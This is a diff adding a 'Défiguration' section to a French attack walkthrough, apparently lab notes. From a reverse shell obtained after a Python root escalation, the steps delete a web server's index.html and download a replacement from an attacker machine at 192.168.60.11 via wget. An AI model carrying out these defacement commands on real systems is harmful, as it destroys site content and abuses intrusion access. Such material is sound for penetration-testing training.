@@ -35,3 +35,27 @@ Utiliser python pour l'escalade:
 Vérifier qu'on est root:
 
 > whoami
+
+## Défiguration
+
+Depuis le reverse shell:
+
+> cd /var/www/html
+
+Vérifier qu'on est dans le bon dossier:
+
+> ls 
+
+Depuis un nouveau terminal kali, dans le dossier server sur le bureau, lancher un serveur pour transférer les fichiers:
+
+> python -m SimpleHTTPServer
+
+Depuis le reverse shell, supprimer index.html:
+
+> rm index.html
+
+Télécharger les fichiers pour afficher la nouvelle page d'acceuil:
+
+> wget http://192.168.60.11:8000/index.html
+
+> wget http://192.168.60.11:8000/index.html
